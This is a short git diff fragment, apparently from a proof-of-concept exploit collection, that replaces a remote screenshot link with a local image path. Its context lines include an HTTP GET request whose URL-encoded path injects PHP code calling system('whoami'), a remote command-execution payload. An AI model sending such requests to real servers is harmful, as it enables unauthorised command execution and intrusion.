@@ -13,7 +13,7 @@ Host:
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
 Accept-Encoding: gzip
 ```
-![8ea7d79a9f251c3befc01adaab3fc5dc](https://github.com/wy876/POC/assets/139549762/8e804b69-b7f9-47ea-bc62-e38f16306733)
+![8ea7d79a9f251c3befc01adaab3fc5dc](../../images/8e804b69-b7f9-47ea-bc62-e38f16306733.png)
 
 ```
 GET /%3Cscript+language=%22php%22%3Esystem%28%22whoami%22%29;%3C/script%3E HTTP/1.1
